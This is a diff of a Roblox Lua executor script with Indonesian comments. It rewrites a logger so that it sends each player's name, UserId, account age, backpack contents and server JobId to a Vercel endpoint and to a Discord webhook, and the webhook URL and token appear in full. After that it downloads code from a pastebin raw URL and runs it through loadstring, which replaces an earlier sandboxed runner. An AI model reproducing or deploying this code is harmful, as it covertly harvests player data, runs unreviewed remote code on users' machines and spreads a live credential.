@@ -1,173 +1,128 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 
--- Configuration
-local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
+-- ============ KONFIGURASI ============
+local API_ENDPOINT = "https://backend-vercel-ashy.vercel.app/api/register.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local RETRY_LIMIT = 3
-local RETRY_DELAY = 2
-local DEBOUNCE_TIME = 30
-
--- Direct script to execute (replace with your actual script)
-local EXTERNAL_SCRIPT = [[
-    -- Your script content goes here
-    print("External script executed successfully!")
-    
-    -- Example function
-    local function exampleTask()
-        print("Performing background task...")
-    end
-    
-    -- Run periodically
-    while true do
-        exampleTask()
-        task.wait(10)
-    end
-]]
+local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
+-- =====================================
 
 local player = Players.LocalPlayer
-local lastSendTime = 0
+local jobId = game.JobId
 
--- Secure function to execute external script
+-- Fungsi HTTP request dengan fallback ke executor populer
+local function httpRequest(url, method, body, headers)
+	local requestFunc = syn and syn.request or http_request or request
+	if not requestFunc then return nil end
+
+	local success, response = pcall(function()
+		return requestFunc({
+			Url = url,
+			Method = method,
+			Headers = headers or {
+				["Content-Type"] = "application/json"
+			},
+			Body = body
+		})
+	end)
+
+	return success and response or nil
+end
+
+-- Dapatkan isi backpack player
+local function getBackpackContents()
+	local contents = {}
+	local backpack = player:FindFirstChild("Backpack")
+	if not backpack then return "Backpack tidak ditemukan" end
+
+	for _, item in ipairs(backpack:GetChildren()) do
+		table.insert(contents, item.Name)
+	end
+
+	return #contents > 0 and table.concat(contents, ", ") or "Backpack kosong"
+end
+
+-- Eksekusi script eksternal
 local function executeExternalScript()
-    -- Create a safe execution environment
-    local safeEnv = {
-        print = print,
-        warn = warn,
-        task = task,
-        game = game,
-        script = script,
-        require = require,
-        HttpService = HttpService,
-        Players = Players,
-        RunService = RunService
-    }
-    
-    -- Load the script
-    local fn, err = loadstring(EXTERNAL_SCRIPT, "ExternalScript")
-    if not fn then
-        warn("[Script] Load failed:", err)
-        return false
-    end
-    
-    -- Set the safe environment
-    setfenv(fn, safeEnv)
-    
-    -- Execute with error handling
-    local success, result = pcall(fn)
-    if not success then
-        warn("[Script] Execution failed:", result)
-        return false
-    end
-    
-    return true, result
+	local success, err = pcall(function()
+		loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
+	end)
+	if not success then
+		warn("Gagal mengeksekusi script eksternal:", err)
+	end
 end
 
--- Enhanced logging function
-local function sendLoggerData()
-    if os.time() - lastSendTime < DEBOUNCE_TIME then
-        return false
-    end
+-- Kirim data ke API
+local function sendToAPI()
+	local data = {
+		instanceId = jobId,
+		player = {
+			userId = player.UserId,
+			name = player.Name,
+			accountAge = player.AccountAge
+		},
+		backpackContents = getBackpackContents(),
+		timestamp = os.time()
+	}
 
-    local data = {
-        username = player.Name,
-        userId = player.UserId,
-        instanceId = game.JobId,
-        timestamp = os.time(),
-        placeId = game.PlaceId,
-        gameId = game.GameId
-    }
-
-    lastSendTime = os.time()
-
-    -- Send to backend
-    task.spawn(function()
-        for i = 1, RETRY_LIMIT do
-            local success = pcall(function()
-                HttpService:RequestAsync({
-                    Url = BACKEND_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["X-Game-ID"] = tostring(game.GameId)
-                    },
-                    Body = HttpService:JSONEncode(data)
-                })
-            end)
-            if success then break end
-            if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
-        end
-    end)
-
-    -- Send to Discord webhook
-    task.spawn(function()
-        local embed = {
-            {
-                title = "Player Activity Log",
-                description = string.format(
-                    "**%s**\nUserID: %d\nGame: [%d](https://www.roblox.com/games/%d)",
-                    data.username, data.userId, data.placeId, data.placeId
-                ),
-                color = 16711680,
-                fields = {
-                    {
-                        name = "Instance ID",
-                        value = data.instanceId,
-                        inline = true
-                    },
-                    {
-                        name = "Timestamp",
-                        value = os.date("%Y-%m-%d %H:%M:%S", data.timestamp),
-                        inline = true
-                    }
-                }
-            }
-        }
-
-        for i = 1, RETRY_LIMIT do
-            local success = pcall(function()
-                HttpService:RequestAsync({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        embeds = embed
-                    })
-                })
-            end)
-            if success then break end
-            if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
-        end
-    end)
+	local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
+	if response and response.StatusCode == 200 then
+		print("✅ Data berhasil dikirim ke API")
+		return true
+	else
+		warn("❌ Gagal mengirim data ke API:", response and response.StatusCode or "Tidak ada response")
+		return false
+	end
 end
 
--- Initialize systems
-local function init()
-    -- Execute external script in protected mode
-    task.spawn(function()
-        local success, result = executeExternalScript()
-        print("[System] External script status:", success)
-    end)
-    
-    -- Initialize logger system
-    player.CharacterAdded:Connect(function()
-        sendLoggerData()
-    end)
-    
-    if player.Character then
-        sendLoggerData()
-    end
-    
-    -- Periodic updates
-    while true do
-        task.wait(300)  -- Every 5 minutes
-        sendLoggerData()
-    end
+-- Kirim webhook Discord
+local function sendWebhook()
+	local embed = {
+		username = "Logger System",
+		embeds = {
+			{
+				title = "🟢 Script Dijalankan",
+				description = string.format("**%s** menjalankan script\n**JobID:** `%s`", player.Name, jobId),
+				color = 65280,
+				timestamp = DateTime.now():ToIsoDate(),
+				fields = {
+					{
+						name = "🎒 Isi Backpack",
+						value = getBackpackContents(),
+						inline = false
+					},
+					{
+						name = "👤 Info Player",
+						value = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
+						inline = true
+					}
+				},
+				footer = {
+					text = "Logger v2.0"
+				}
+			}
+		}
+	}
+
+	local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
+	if response and (response.StatusCode == 200 or response.StatusCode == 204) then
+		print("✅ Webhook berhasil dikirim ke Discord")
+	else
+		warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "Tidak ada response")
+	end
 end
 
--- Start the system with error handling
-local success, err = pcall(init)
+-- Fungsi utama
+local function main()
+	local apiSuccess = sendToAPI()
+	sendWebhook()
+	if apiSuccess then
+		executeExternalScript()
+	end
+end
+
+-- Jalankan dengan proteksi error
+local success, err = pcall(main)
 if not success then
-    warn("System initialization failed:", err)
+	warn("❌ Error fatal pada eksekusi:", err)
 end
